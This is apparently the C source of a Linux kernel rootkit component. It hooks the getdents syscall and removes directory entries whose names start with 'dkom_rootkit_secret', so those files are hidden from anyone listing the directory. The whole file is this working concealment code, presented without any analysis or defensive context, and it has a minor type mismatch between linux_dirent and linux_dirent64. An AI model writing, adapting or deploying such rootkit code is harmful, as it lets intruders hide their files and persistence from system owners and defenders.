#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/sched/signal.h>
#include <linux/fdtable.h>
// This header provides the full definition of struct files_struct and related structures, 
// allowing you to access fdt and fd.


#define STEALTH_PREFIX "dkom_rootkit_secret"
#define PROC_ROOT_INO 1


///////////////////////////////
//   Define struct
///////////////////////////////
struct linux_dirent64 {
    unsigned long long  d_ino;    // 64-bit inode number
    long long           d_off;    // 64-bit offset to next dirent
    unsigned short      d_reclen; // length of this dirent
    unsigned char       d_type;   // file type
    char                d_name[]; // filename (null-terminated)
};



///////////////////////////////
//      Modified getdents 
///////////////////////////////
asmlinkage long (*orig_getdents)(struct pt_regs *regs);

// See if the folder name is the stealth prefix
static int is_hidden_entry(const char *entry_name) {
  if (strncmp(STEALTH_PREFIX, entry_name, sizeof(STEALTH_PREFIX)-1) == 0)
    return 1;
  else return 0;
}

asmlinkage long fh_getdents(const struct pt_regs *regs);
asmlinkage long fh_getdents(const struct pt_regs *regs) {
  int file_desc = (int) regs->di;
  struct linux_dirent *user_dirent = (struct linux_dirent *) regs->si;
  struct linux_dirent64 *kernel_buf, *current_entry, *last_valid = NULL;
  struct inode *dir_inode;
  int is_proc_root = 0;

  // Invoke original system call
  int bytes_read = orig_getdents((struct pt_regs *)regs);
  if (bytes_read <= 0) 
    return bytes_read;

  // Allocate kernel-space buffer
  kernel_buf = kzalloc(bytes_read, GFP_KERNEL);
  if (!kernel_buf) 
    return -ENOMEM;

  // Copy userspace data to kernel buffer
  if (copy_from_user(kernel_buf, user_dirent, bytes_read)) {
    kfree(kernel_buf);
    return -EFAULT; // -EFAULT is a standard Linux error code meaning "bad address"
  }

  // Get inode information for filtering
  dir_inode = current->files->fdt->fd[file_desc]->f_path.dentry->d_inode;
  if (dir_inode->i_ino == PROC_ROOT_INO && !MAJOR(dir_inode->i_rdev))
    is_proc_root = 1;

  unsigned long buffer_offset = 0;
  while (buffer_offset < bytes_read) {
    current_entry = (void *)kernel_buf + buffer_offset;
    
    if (!is_proc_root && is_hidden_entry(current_entry->d_name)) {
      if (current_entry == kernel_buf) {
        // Remove first entry case
        bytes_read -= current_entry->d_reclen;
        memmove(current_entry, (void *)current_entry + current_entry->d_reclen, bytes_read);
        continue;
      }
      // Merge with previous entry
      last_valid->d_reclen += current_entry->d_reclen;
    } else {
      last_valid = current_entry;
    }
    
    buffer_offset += current_entry->d_reclen;
  }

  // Copy filtered results back to userspace
  if (copy_to_user(user_dirent, kernel_buf, bytes_read))
    bytes_read = -EFAULT;

  kfree(kernel_buf);
  return bytes_read;
}